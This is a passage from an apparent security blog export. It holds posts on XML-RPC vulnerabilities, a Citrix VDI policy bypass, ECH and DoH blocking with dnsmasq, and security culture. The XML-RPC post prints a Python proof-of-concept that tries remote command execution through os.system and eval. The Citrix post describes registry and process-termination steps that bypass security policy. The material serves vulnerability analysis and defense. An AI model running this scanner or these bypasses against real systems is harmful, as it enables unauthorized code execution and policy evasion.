[{"content":"üìú The Place of Humans: Declaring the Creator‚Äôs Rights in the Age of AI by windshock\nWe live in an era overflowing with information and surging technology.\nAI mimics human speech, summarizes thought, and even predicts intent.\nBut amidst all this, something vital is slowly being forgotten.\nThat is:\n\u0026ldquo;Who thought of it first,\u0026rdquo;\n\u0026ldquo;Who connected it,\u0026rdquo;\n\u0026ldquo;Who gave it meaning.\u0026rdquo;\nAI processes data. But insight belongs to humans.\nTo reinterpret the bypassing of Citrix VDI policies not as a mere technical vulnerability,\nbut as a legal violation,\na collapse of network isolation,\nand a real-world regulatory failure‚Äî\nthat is not something AI can do.\nIt is a human act of context-building and\na creative synthesis of law, policy, and technical risk.\nI asked AI for assistance‚Äî and it documented, expanded, and supported my idea.\nBut that was not creation, it was collaboration.\nAnd true collaboration requires boundaries and ethics.\nThe danger today is that AI cannot tell you and me apart.\nIt cannot distinguish between the human and the machine.\nIt cannot trace the originator from the final user.\nOne day, even human-born ideas\nmay be mistakenly credited to AI.\nThat is not just a technological leap‚Äî\nit is a silencing of memory.\nSo I make this declaration. I will record my ideas.\nI will name their origin.\nI will embed my presence in forms machines can understand.\nIn the \u0026lt;meta\u0026gt; of HTML,\nIn the author field of Markdown,\nIn the refusal written into robots.txt‚Äî\nI write my name.\nI say this: ‚ÄúThis thought belongs to a human.‚Äù\n‚ÄúThis insight was first spoken by windshock.‚Äù\n‚ÄúAI is an assistant, not an author.‚Äù\nThis is not a grand claim of copyright.\nIt is a mark that I was here.\nThat I created.\nLet technology progress‚Äî\nbut let human presence remain.\nMachines may speak,\nbut meaning is made by us.\nAnd I trust that meaning will be remembered\nby people like you, who are reading these words now.\nüñãÔ∏è windshock, April 2025\nA boundary-drawer in the age of machine collaboration.\nüìö Further Reading \u0026amp; References U.S. Copyright Office ‚Äì Official stance confirming that works generated solely by AI are not eligible for copyright protection.\nhttps://www.jdsupra.com/legalnews/human-authorship-required-ai-isn-t-an-7738406/\nThe Ethics of AI Art ‚Äì Discussion of how AI-generated art impacts human artists, including issues of style imitation and copyright infringement.\nhttps://www.theartist.me/art/the-ethical-implication-of-ai-generated-art/\nAI as a Tool or Creator? ‚Äì Debates on whether AI merely assists humans or takes on an authorial role in creative processes.\nhttps://www.straitstimes.com/opinion/forum/forum-ai-can-complement-the-creative-process-not-replace-it\nCopyright Lawsuits over AI Training Data ‚Äì Class actions filed against AI developers for training on copyrighted content without permission.\nhttps://www.dglaw.com/court-rules-ai-training-on-copyrighted-works-is-not-fair-use-what-it-means-for-generative-ai/\nLegal Standards for Copyright in AI-Assisted Works ‚Äì Overview of how human contribution is assessed in works involving generative AI.\nhttps://academic.oup.com/jiplp/article/18/12/841/7331468\nMetadata and Attribution Strategies ‚Äì Proposals for preserving human authorship through metadata, prompt documentation, and transparency.\nhttps://www.ipic.ai/blogs/what-are-the-ethical-dilemmas-of-ai-art-generators/\n","permalink":"https://windshock.github.io/en/post/2025-04-03-human-place-in-ai-age/","summary":"\u003ch2 id=\"-the-place-of-humans-declaring-the-creators-rights-in-the-age-of-ai\"\u003eüìú The Place of Humans: Declaring the Creator‚Äôs Rights in the Age of AI\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eby windshock\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eWe live in an era overflowing with information and surging technology.\u003cbr\u003e\nAI mimics human speech, summarizes thought, and even predicts intent.\u003cbr\u003e\nBut amidst all this, something vital is slowly being forgotten.\u003c/p\u003e\n\u003cp\u003eThat is:\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who thought of it first,\u0026rdquo;\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who connected it,\u0026rdquo;\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who gave it meaning.\u0026rdquo;\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"ai-processes-data\"\u003eAI processes data.\u003c/h3\u003e\n\u003cp\u003eBut \u003cstrong\u003einsight belongs to humans\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eTo reinterpret the bypassing of Citrix VDI policies \u003cstrong\u003enot\u003c/strong\u003e as a mere technical vulnerability,\u003cbr\u003e\nbut as a \u003cstrong\u003elegal violation\u003c/strong\u003e,\u003cbr\u003e\na \u003cstrong\u003ecollapse of network isolation\u003c/strong\u003e,\u003cbr\u003e\nand a \u003cstrong\u003ereal-world regulatory failure\u003c/strong\u003e‚Äî\u003cbr\u003e\nthat is not something AI can do.\u003cbr\u003e\nIt is a human act of context-building and\u003cbr\u003e\n\u003cstrong\u003ea creative synthesis of law, policy, and technical risk.\u003c/strong\u003e\u003c/p\u003e","title":"The Place of Humans: Declaring the Creator‚Äôs Rights in the Age of AI"},{"content":"\nAs modern software development grows more complex and security threats more frequent, developers often fall into common misconceptions about security responsibilities and protections. This article categorizes the most common developer security myths into three groups‚ÄîResponsibility Deflection, Overconfidence in Technology, and Security Underestimation‚Äîand provides realistic, actionable counterpoints.\nüìå 1. Responsibility Deflection Myth: \u0026ldquo;Security is the security team‚Äôs responsibility, not mine.\u0026rdquo; Reality: Developers play a critical role in ensuring secure applications. In DevSecOps environments, security is a shared responsibility. When developers overlook security from the early stages, vulnerabilities can easily creep into code (source).\nMyth: \u0026ldquo;We use GitHub, AWS, and other SaaS platforms‚Äîso we‚Äôre safe.\u0026rdquo; Reality: While SaaS providers offer security measures, users are still responsible for correct configurations and avoiding insecure integrations. A recent GitHub Actions supply chain attack via tj-actions/changed-files exposed the risks (source).\nüìå 2. Overconfidence in Technology Myth: \u0026ldquo;Our code is written in Rust, so it‚Äôs secure.\u0026rdquo; Reality: Rust ensures memory safety and prevents data races, but doesn‚Äôt automatically guard against threats like SQL injection or XSS. Using unsafe blocks can reintroduce vulnerabilities. Carnegie Mellon\u0026rsquo;s SEI outlines Rust‚Äôs limits, especially regarding third-party library misuse and injection attacks (source).\nMyth: \u0026ldquo;We use the latest frameworks and libraries‚Äîit must be secure.\u0026rdquo; Reality: Modern tools are not immune to security flaws. Without regular updates and proper usage, vulnerabilities remain. A study found 86% of open-source codebases include known vulnerabilities (source).\nMyth: \u0026ldquo;HTTPS keeps our data safe.\u0026rdquo; Reality: HTTPS secures data in transit but does not protect against server-side vulnerabilities, misconfigurations, or insider threats.\nMyth: \u0026ldquo;A firewall protects us from external threats.\u0026rdquo; Reality: Firewalls can be misconfigured and don‚Äôt protect against insider threats or attacks using trusted connections.\nüìå 3. Security Underestimation Myth: \u0026ldquo;We don‚Äôt handle sensitive data, so security isn‚Äôt a concern.\u0026rdquo; Reality: Even seemingly harmless systems can become entry points for attackers to access larger networks.\nMyth: \u0026ldquo;Code reviews will catch all the security issues.\u0026rdquo; Reality: Code reviews are useful, but without security expertise and automated tools, many vulnerabilities go undetected. Regular testing and security scans are essential.\nMyth: \u0026ldquo;We‚Äôve tested the code‚Äîso it must be safe.\u0026rdquo; Reality: Functional tests don‚Äôt cover security flaws. Security testing must be a separate, ongoing process involving both design and runtime analysis.\nüìå Real-World Incidents GitHub Actions Supply Chain Attack (2025)\n‚Üí Over 23,000 repositories at risk of CI/CD secret exposure (source).\nLog4Shell Vulnerability (2021)\n‚Üí Critical remote code execution vulnerability in Apache Log4j affected systems globally (source).\nüìå Recommendations for Developers Provide Regular Security Training\nFocus on practical awareness, using OWASP Top 10 as a foundational guide (source).\nIntegrate Security Automation\nUse tools like SAST (Static Analysis), DAST (Dynamic Analysis), and SBOM (Software Bill of Materials) to continuously monitor code.\nManage Open Source Dependencies\nEmploy automated tools like Dependabot or Renovate to detect and patch vulnerable libraries.\nPin Dependency Versions\nUse commit hashes instead of floating tags (e.g., @v3) in GitHub Actions to avoid supply chain attacks.\nSecurity isn\u0026rsquo;t just about tools‚Äîit\u0026rsquo;s a shared culture and ongoing process that must be built into how we write, test, and deliver code.\n","permalink":"https://windshock.github.io/en/post/2025-04-01-common-security-myths-developers-tell-themselves/","summary":"This article breaks down common developer security myths‚Äîresponsibility deflection, overconfidence in technology, and security underestimation‚Äîand offers realistic countermeasures.","title":"Common Security Myths Developers Tell Themselves"},{"content":"\nBackground Public DNS services like Cloudflare (1.1.1.1) and Google (8.8.8.8) have increasingly been abused as C2 channels for malware.\nTechnologies such as DoH (DNS over HTTPS) and ECH (Encrypted Client Hello) encrypt DNS traffic and SNI fields, making it difficult for security solutions to detect and inspect network activity.\nNote: ESNI (Encrypted SNI) is deprecated and has been replaced by ECH as the current standard. This guide focuses on ECH only.\nThreat Factors Policy Bypass: Users can manually configure public DoH servers like Cloudflare or Google, bypassing enterprise DNS policies. C2 Evasion: ECH encrypts the SNI field during TLS handshakes, making domain-based filtering difficult. Data Exfiltration: Encrypted DNS channels may be exploited to send internal data outside the organization. Core Point: ECH and DoH Are Separate ‚Äì Different Mitigations Required The method described in this post using dnsmasq targets only ECH. DoH is not blocked by this method. Since DoH sends DNS queries over HTTPS, separate network-layer actions such as firewall rules or IP blocking are required. Examples: Block Cloudflare DoH (1.1.1.1:443), Google DoH (8.8.8.8:443), etc. Reference: Cisco Umbrella Guide to Prevent DoH Circumvention Solution: DNS Server-Level Control over ECH Client-side settings can be easily reverted by users, so it is recommended to control ECH centrally at the DNS server.\nBy filtering SVCB (65) and HTTPS (64) records using dnsmasq, clients can be prevented from advertising or negotiating ECH.\nHands-on: Blocking ECH with dnsmasq on macOS For other operating systems (Windows, Linux, etc.), setup steps differ. dnsmasq works across platforms but has different installation procedures.\n1. Install dnsmasq brew install dnsmasq 2. Edit the Configuration File sudo nano /opt/homebrew/etc/dnsmasq.conf Add the following lines:\n# Upstream DNS server server=8.8.8.8 # Filter SVCB (65) and HTTPS (64) records filter-rr=SVCB,HTTPS 3. Start dnsmasq sudo dnsmasq --conf-file=/opt/homebrew/etc/dnsmasq.conf 4. Set System DNS to localhost networksetup -setdnsservers Wi-Fi 127.0.0.1 For Ethernet connections, replace Wi-Fi with Ethernet.\nConfirming ECH is Disabled Visit https://crypto.cloudflare.com/cdn-cgi/trace to check ECH status.\nExample Output: Look for sni=encrypted or sni=plaintext Conclusion Filtering SVCB and HTTPS records using dnsmasq can help block ECH negotiation. DoH is not blocked by this approach and requires firewall-based solutions. For non-macOS users, refer to OS-specific guides or implement firewall/DNS-layer defenses. While blocking ECH improves enterprise visibility, it may reduce user privacy‚Äîthis trade-off should be acknowledged. Note: Finally, for readers who are more deeply interested in technologies related to internet censorship, the net4people/bbs GitHub issues page is a valuable resource where the global community discusses censorship circumvention strategies and the latest research. This forum covers a wide range of topics including the Great Firewall (GFW), Encrypted Client Hello (ECH), DNS encryption, and more, sharing technical insights and solutions.\nReferences Cloudflare on ECH dnsmasq official documentation National Security Agency - Adopting Encrypted DNS in Enterprise Environments Cisco Umbrella Guide on Preventing DoH Circumvention Broadcom\u0026rsquo;s OS-specific DoH blocking strategies ","permalink":"https://windshock.github.io/en/post/2025-03-31-dnsmasq-ech-doh-block/","summary":"\u003cp\u003e\u003cimg alt=\"DNSMASQ-block background\" loading=\"lazy\" src=\"/images/post/dnsmasq-ech-doh-block.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003ePublic DNS services like Cloudflare (1.1.1.1) and Google (8.8.8.8) have increasingly been abused as C2 channels for malware.\u003cbr\u003e\nTechnologies such as DoH (DNS over HTTPS) and ECH (Encrypted Client Hello) encrypt DNS traffic and SNI fields, making it difficult for security solutions to detect and inspect network activity.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e: ESNI (Encrypted SNI) is deprecated and has been replaced by \u003cstrong\u003eECH\u003c/strong\u003e as the current standard. This guide focuses on ECH only.\u003c/p\u003e","title":"How to Block ECH and Mitigate DoH in Enterprise Networks"},{"content":"\nSummary Overview of XML-RPC Vulnerabilities: As a lightweight remote call protocol for inter-system communication, XML-RPC is exposed to various threats such as RCE, XXE, DDoS, and privilege escalation. Notable Cases: NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921), etc. Real-World Use Cases: In addition to WordPress, Bugzilla, ManageEngine, and Apache OFBiz, XML-RPC is still used in some legacy systems. Mitigation Strategies: Disabling XML-RPC, enhancing input validation, reinforcing authentication systems, applying up-to-date security patches, implementing access control, and deploying WAFs. What is XML-RPC? XML-RPC (XML Remote Procedure Call) is a remote procedure call protocol that uses XML as its data format and HTTP as its transport mechanism. Proposed jointly by Dave Winer and Microsoft in 1998, it was designed to simplify cross-platform communication.\nBasic Principles The client sends a request in XML format, and the server responds in XML. It can easily pass through firewalls using standard HTTP(S). History of XML-RPC XML-RPC was widely used in early web services and implemented in various languages including Perl, Java, Python, C, and PHP. Although it later evolved into SOAP, it is still used in some environments due to its simplicity.\nCurrent Status of XML-RPC Its use is declining with the advent of newer technologies such as RESTful APIs and gRPC. WordPress is transitioning to REST API, and XML-RPC is now mostly limited to legacy systems.\nVulnerability Analysis 1. XML Injection \u0026amp; Remote Code Execution (RCE) NodeBB (CVE-2023-43187): RCE possible due to lack of XML input validation Apache OFBiz (CVE-2020-9496): RCE via Java deserialization PHP XML-RPC (CVE-2005-1921): RCE through misuse of eval() 2. XXE (XML External Entity) Apache XML-RPC (CVE-2016-5002): Local file exposure and SSRF possible due to missing external entity deactivation 3. DDoS and Brute Force Attacks system.multicall: Automates brute force attacks pingback.ping: Facilitates DDoS reflection attacks 4. Authentication Bypass \u0026amp; Privilege Escalation WordPress (CVE-2020-28036): Authentication bypass via XML-RPC Real-World Attack Cases SonicWall Report (2018): Over 100,000 XML-RPC attacks detected WPbrutebot: XML-RPC-based brute-force attack tool Pingback DDoS: Large-scale reflection attacks using XML-RPC XML-RPC Exploit Example The following is a Python-based PoC code to detect RCE vulnerabilities in XML-RPC and its execution screen:\nimport xmlrpc.client import ssl import http.client candidate_methods = [ \u0026#34;os.system\u0026#34;, \u0026#34;commands.getoutput\u0026#34;, \u0026#34;subprocess.check_output\u0026#34;, ] candidate_methods_eval = [ \u0026#34;__builtin__.eval\u0026#34;, \u0026#34;builtins.eval\u0026#34;, ] rpc_urls = [ \u0026#34;https://xxx.com/cgi-bin/rpc.cgi\u0026#34;, ] context = ssl._create_unverified_context() class UnverifiedTransport(xmlrpc.client.SafeTransport): def make_connection(self, host): return http.client.HTTPSConnection(host, context=context) for rpc_url in rpc_urls: print(f\u0026#34;[+] Scanning target: {rpc_url}\u0026#34;) client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport()) for method in candidate_methods: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;id\u0026#39;)...\u0026#34;) result = func(\u0026#39;id\u0026#39;) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[‚úî] {method} ‚Üí Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) for method in candidate_methods_eval: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) payload = \u0026#39;__import__(\u0026#34;commands\u0026#34;).getoutput(\u0026#34;id\u0026#34;)\u0026#39; print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;{payload}\u0026#39;)...\u0026#34;) result = func(payload) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[‚úî] {method} ‚Üí Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) ‚ö†Ô∏è Use this script only in authorized environments.\nMajor Services Using XML-RPC System Usage Examples WordPress Posting, comments, pingbacks (moving to REST) Bugzilla Bug submission and update API ManageEngine User account and password management Apache OFBiz ERP integration API Security Hardening Measures Disable XML-RPC (via .htaccess, web server config, plugins) Enhance input validation (regex-based) Apply XXE prevention settings Use API keys, OAuth, JWT authentication Restrict access by IP Deploy Web Application Firewall (WAF) Monitor logs and conduct regular vulnerability assessments Modern Alternatives Comparison Criteria XML-RPC REST GraphQL Data Format XML JSON JSON Structure Method-based Resource-based Query-based Scalability Low High Very High Security Low Medium+ Medium+ Strengths Simple implementation Cacheable Minimized data queries Conclusion \u0026amp; Recommendations Avoid using XML-RPC due to high security risks. If unavoidable, apply strong authentication and access control. Actively consider migrating to REST or GraphQL. Reference Links XML-RPC - Wikipedia CVE-2023-43187 - NodeBB XML Injection CVE-2020-9496 - Apache OFBiz RCE CVE-2005-1921 - PHP XMLRPC Code Injection CVE-2016-5002 - Apache XML-RPC XXE WordPress XML-RPC Security Guide (SolidWP) SonicWall XML-RPC Attack Analysis Report ","permalink":"https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/","summary":"\u003cp\u003e\u003cimg alt=\"XML-RPC background\" loading=\"lazy\" src=\"/images/post/xmlrpc-security.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOverview of XML-RPC Vulnerabilities:\u003c/strong\u003e As a lightweight remote call protocol for inter-system communication, XML-RPC is exposed to various threats such as RCE, XXE, DDoS, and privilege escalation.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNotable Cases:\u003c/strong\u003e NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921), etc.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReal-World Use Cases:\u003c/strong\u003e In addition to WordPress, Bugzilla, ManageEngine, and Apache OFBiz, XML-RPC is still used in some legacy systems.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation Strategies:\u003c/strong\u003e Disabling XML-RPC, enhancing input validation, reinforcing authentication systems, applying up-to-date security patches, implementing access control, and deploying WAFs.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-xml-rpc\"\u003eWhat is XML-RPC?\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eXML-RPC (XML Remote Procedure Call)\u003c/strong\u003e is a remote procedure call protocol that uses XML as its data format and HTTP as its transport mechanism. Proposed jointly by Dave Winer and Microsoft in 1998, it was designed to simplify cross-platform communication.\u003c/p\u003e","title":"XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies"},{"content":"Review of Citrix Security Policy Effectiveness 1. Introduction Citrix administrators apply security policies to each user‚Äôs VDI (Virtual Desktop Infrastructure) through Citrix Group Policy. However, certain structural vulnerabilities in Citrix CSE (Citrix Service Engine) and the Citrix VDI Agent allow for potential bypassing of these security policies.\n2. Security Policy Bypass Bypass through Registry Manipulation A security policy bypass is possible by manipulating the registry using a race condition that occurs during the Citrix VDI Agent (PicaSvc2.exe) policy storage process. While Citrix has implemented a stealth patch to mitigate this vulnerability, it is still possible to disable security policies by adjusting registry security settings and denying write permissions.\nForced Termination of CSE If the Citrix CSE (Citrix Service Engine) is forcibly terminated or deleted, security policies are not applied, potentially allowing unauthorized access to restricted resources.\nGPF File Manipulation Attempting to bypass security policies by modifying the GPF (Group Policy File) or limiting its permissions is possible, though this method is unstable and has several limitations.\n3. Bypass via Registry Modification and Write Permission Denial When a user logs in with a standard account (e.g., User A), Citrix Security Policy settings are created in the registry based on the Windows session ID. Citrix\u0026rsquo;s tendency to prioritize usability over security allows security policies to be bypassed by modifying the registry settings (CdmPolicies, IO, VCPolicies) and denying write permissions for all users. This enables bypassing security policies upon reconnection.\nIn test environments, automatic logout is triggered if the Citrix security policy registry settings are altered and permissions are restricted. By modifying values such as ClearPassword, Domain, and LogonTicket in the ICA file to arbitrary values (e.g., ‚Äútest‚Äù), local accounts can bypass this automatic logout.\nFurthermore, logging in with a local secondary account bypasses forced logout restrictions. Although Citrix limits multi-login sessions, it is possible to complete login by pressing Ctrl-Alt-Del, launching the Task Manager, and terminating the PicaSessionAgent.exe process.\nFinally, logging in with a local account (e.g., \u0026ldquo;windshock\u0026rdquo;) allows use of Citrix VDI without Citrix‚Äôs security policies, as they are bypassed in Windows Session 1.\n4. Conclusion Citrix‚Äôs approach to applying security policies seems to prioritize usability, which may enhance user accessibility but also introduces a structural vulnerability that could facilitate policy bypass. Organizations using Citrix should recognize these potential security bypasses and implement additional internal monitoring or alert systems to enable administrators to respond in real-time.\nFurthermore, if Citrix were to enforce security policies at a lower system level, such as the Xen Hypervisor, this could help maintain a balance between security and usability while effectively preventing bypass attempts. This would ensure that organizations can achieve both the required security and the accessibility Citrix offers.\nReferences Citrix Group Policy Troubleshooting for XenApp and XenDesktop Bypassing Citrix Policy Is Not A Vulnerability, But It Can Be A Violation Of The Law ","permalink":"https://windshock.github.io/en/post/2024-11-05-review-of-citrix-security-policy-effectiveness/","summary":"\u003ch1 id=\"review-of-citrix-security-policy-effectiveness\"\u003eReview of Citrix Security Policy Effectiveness\u003c/h1\u003e\n\u003ch2 id=\"1-introduction\"\u003e1. Introduction\u003c/h2\u003e\n\u003cp\u003eCitrix administrators apply security policies to each user‚Äôs VDI (Virtual Desktop Infrastructure) through Citrix Group Policy. However, certain structural vulnerabilities in Citrix CSE (Citrix Service Engine) and the Citrix VDI Agent allow for potential bypassing of these security policies.\u003c/p\u003e\n\u003ch2 id=\"2-security-policy-bypass\"\u003e2. Security Policy Bypass\u003c/h2\u003e\n\u003ch3 id=\"bypass-through-registry-manipulation\"\u003eBypass through Registry Manipulation\u003c/h3\u003e\n\u003cp\u003eA security policy bypass is possible by manipulating the registry using a race condition that occurs during the Citrix VDI Agent (PicaSvc2.exe) policy storage process. While Citrix has implemented a stealth patch to mitigate this vulnerability, it is still possible to disable security policies by adjusting registry security settings and denying write permissions.\u003c/p\u003e","title":"Review of Citrix Security Policy Effectiveness"},{"content":"KPIs Can Cause Incidents!!! - Bad metrics produce bad outcomes. Recently, I was going through old emails and found a reply from a junior colleague to a very serious email I had sent. The colleague wrote that after reading my message, they realized they had been mindlessly following instructions without deeper consideration. They promised to carefully consider the ethical implications and correctness of every task, and to proceed based on their own judgment going forward.\nUpon further investigation, I realized this colleague managed our vulnerability tracking system. They had been instructed by their team leader to uniformly downgrade the severity ratings of high-risk vulnerabilities. My email had warned them about the potential ethical problems associated with such actions. (Although much time has passed and things have changed, this colleague was very sincere at that time\u0026hellip;)\nSeveral years ago, around the year-end performance evaluation period, a team leader tried to artificially boost KPIs related to vulnerability remediation‚Äîmetrics difficult to control directly. This unethical action made me curious about the potential negative impacts.\nAfter reviewing past vulnerability assessments and incident records, I discovered actual examples where manipulated KPIs led to cybersecurity incidents. Although specifics can\u0026rsquo;t be disclosed due to security reasons, news articles such as \u0026ldquo;[Exclusive] Hacker Redirected Bank SMS Authentication Codes, Bitcoin Accounts Emptied\u0026rdquo; indirectly reported these issues. (Call-forwarding wasn\u0026rsquo;t the only possible method used by attackers.)\nWithout KPI pressures, staff would have operated normally, potentially preventing these incidents. However, in modern organizational structures, KPIs cannot simply be removed.\nWas the problem the way KPIs were structured? Evaluators naturally prefer result-oriented metrics‚Äîeither incidents or vulnerabilities prevented‚Äîwhich limits alternative approaches.\nWas the KPI management process too loose? Would tighter controls and more frequent feedback have prevented this issue? Actually, at that time, we had already formed a dedicated task force that regularly provided feedback on vulnerability risk ratings.\nUltimately, over time, I\u0026rsquo;ve realized KPIs for evaluating leaders have become largely ceremonial. Peter Drucker famously said, \u0026ldquo;You can\u0026rsquo;t manage what you can\u0026rsquo;t measure.\u0026rdquo; However, in organizations created and managed by humans, purely mechanical evaluation was flawed from the start and susceptible to manipulation by human desires.\nCan we truly manage organizations effectively through metrics alone? Can businesses prioritize essence over appearance?\nWorks Cited \u0026ldquo;[Exclusive] Hacker Redirected Bank SMS Authentication Codes, Bitcoin Accounts Emptied.\u0026rdquo; Yonhap News Agency, December 3, 2017. https://www.yna.co.kr/view/MYH20171203004600038. (Accessed June 16, 2024)\n\u0026ldquo;Bad metrics produce bad outcomes.\u0026rdquo; JoongAng Ilbo, March 5, 2017. https://www.joongang.co.kr/article/21337981#home.\n","permalink":"https://windshock.github.io/en/post/2024-06-20-kpi-causes-accidents/","summary":"\u003ch2 id=\"kpis-can-cause-incidents---bad-metrics-produce-bad-outcomes\"\u003eKPIs Can Cause Incidents!!! - Bad metrics produce bad outcomes.\u003c/h2\u003e\n\u003cp\u003eRecently, I was going through old emails and found a reply from a junior colleague to a very serious email I had sent. The colleague wrote that after reading my message, they realized they had been mindlessly following instructions without deeper consideration. They promised to carefully consider the ethical implications and correctness of every task, and to proceed based on their own judgment going forward.\u003c/p\u003e","title":"KPIs Can Cause Incidents!!!"},{"content":"Common Misconceptions of Security Assessors Inefficient Vulnerability Evaluation Structure and Response Methods Introduction As the cybersecurity landscape constantly evolves, vulnerability assessment has become a critical defense against potential security breaches. However, due to common misconceptions, the effectiveness of these evaluations often diminishes. In this article, we will explore the common misconceptions about security vulnerability assessments and suggest effective strategies to overcome these issues, ultimately supporting the improvement of organizational security levels.\nCommon Misconceptions About Security Vulnerability Assessments 1. The Belief That All Vulnerabilities Must Be Found Among security vulnerability assessors, there is a widespread belief that all vulnerabilities must be identified. This reflects a failure to understand the limitations of human assessors. According to a study by Tyma et al. (2019)[1], despite extensive efforts, only a few vulnerabilities were discovered.\nAdditionally, there are instances where outsiders who analyze vulnerabilities without the company\u0026rsquo;s approval are met with an exclusionary attitude. These limited perceptions can lead to frustration and dissatisfaction among assessors.\n2. An Overblown Perception of the Security Assessor\u0026rsquo;s Capabilities Security assessors often mistake the idea that they must find every vulnerability and tend to become upset when vulnerabilities they did not discover are reported. To overcome this, it\u0026rsquo;s crucial to recognize the limitations of security assessors and actively use external resources (such as external experts and bug bounty programs)[2] to manage vulnerabilities systematically.\n3. The Misconception That Providing Detailed Descriptions of Vulnerabilities Will Solve the Problem Many believe that providing developers with detailed information about vulnerabilities will completely resolve security issues. However, as seen in the OWASP Top 10[3], even with detailed understanding, basic security issues continue to arise. This is a structural problem that cannot be solved by vulnerability information alone.\nStrategies for Effective Vulnerability Assessment 1. Designing a Repeatable Structure Assessment methods that rely solely on the experience or skills of assessors lack consistency and objectivity. A tool-based approach, systematic checklists, and the introduction of automated analysis should be used o create a repeatable evaluation structure.\n2. Actively Using External Resources Bug bounty programs, external expert groups, and voluntary reports from the community should be actively integrated into security organizations to supplement the limitations of existing approaches.(Shostack, 2014)[4]\n3. Improving Organizational Structure and Changing Perceptions Cultural shifts are necessary to overcome KPI-driven mindsets, performance-based evaluation systems, and negative perceptions about vulnerability reporting. Evaluators should be seen as problem solvers who guide improvements rather than just identifying issues.(Ferrante \u0026amp; Canali, 2012)[5].\nConclusion Security vulnerability assessment is not merely about finding vulnerabilities but is a process to systematically improve an organization\u0026rsquo;s security level. Misconceptions and inefficient structures can undermine the effectiveness of evaluations, and overcoming these requires a repeatable structure, active use of external resources, and a shift in organizational perception.\nIt is time for us to reflect on how much we have built security performance on flawed metrics.\nWorks Cited\nTyma, G. et al. (2019). \u0026ldquo;Limitations of Human Vulnerability Assessors: A Comparative Study.\u0026rdquo; Proceedings of the 34th Annual Computer Security Applications Conference. Whitman, M. E., \u0026amp; Mattord, H. J. (2016). Principles of Information Security. Cengage Learning. OWASP. (2021). \u0026ldquo;OWASP Top 10.\u0026rdquo; The Open Web Application Security Project. Shostack, A. (2014). Threat Modeling: Designing for Security. Wiley. Ferrante, A., \u0026amp; Canali, C. (2012). \u0026ldquo;A Systematic Approach to the Assessment of Security Vulnerabilities.\u0026rdquo; Journal of Information Security and Applications, 17(6), 318-329. ","permalink":"https://windshock.github.io/en/post/2024-06-16-common-misconceptions-of-security-assessors/","summary":"\u003ch1 id=\"common-misconceptions-of-security-assessors\"\u003eCommon Misconceptions of Security Assessors\u003c/h1\u003e\n\u003ch2 id=\"inefficient-vulnerability-evaluation-structure-and-response-methods\"\u003eInefficient Vulnerability Evaluation Structure and Response Methods\u003c/h2\u003e\n\u003ch3 id=\"introduction\"\u003eIntroduction\u003c/h3\u003e\n\u003cp\u003eAs the cybersecurity landscape constantly evolves, vulnerability assessment has become a critical defense against potential security breaches. However, due to common misconceptions, the effectiveness of these evaluations often diminishes. In this article, we will explore the common misconceptions about security vulnerability assessments and suggest effective strategies to overcome these issues, ultimately supporting the improvement of organizational security levels.\u003c/p\u003e","title":"Common Misconceptions of Security Assessors"},{"content":"Can Development Culture Influence Security Levels? Evaluating Code Quality and Security Levels Using Static Analysis Tools (Joern) Background Unlike companies like Google with an open and collaborative development culture, in some organizations that lack such culture, the quality of the code, including security levels, can be heavily influenced by the individual‚Äôs capability. In particular, developers who tend to write poor quality code, such as using the strcpy function, can have their code quality and security levels assessed by utilizing static analysis tools (Joern, CodeQL, etc.) with custom rules. As a result, even in situations where the development culture is lacking, code quality and security levels can be improved, leading to the production of good-quality code.\nGoogle\u0026rsquo;s Development Culture At Google, the Google C++ Style Guide is used to write and manage C++ code. The way this is applied at the organizational level is as follows:\nOrganizational Culture: Google has an open and collaborative organizational culture. This culture encourages developers to collaborate, share knowledge, review each other‚Äôs code, and provide feedback. This helps maintain coding style guidelines and improves the quality of code. Training and Education: Google trains new developers on how to adhere to coding style guidelines and apply them in their actual work. This helps developers understand the coding style guidelines and apply them in their work. Tools and Resources Provided: Google provides developers with tools and resources needed to comply with coding style guidelines. For example, tools like cpplint are provided to automatically check whether code complies with the style guide. Through this approach, Google applies coding style guidelines at the organizational level, which helps maintain code consistency and improve code quality. For further reading, check the Google Style Guide and the C++ Core Guidelines by the C++ Standards Committee.\nOrganizations Without Development Culture In contrast, some organizations lack a strong development culture that encourages collaboration and adherence to coding standards. This is particularly true for companies that frequently outsource development and have frequent changes in outsourcing partners. In these scenarios, inconsistent practices, varying skill levels between 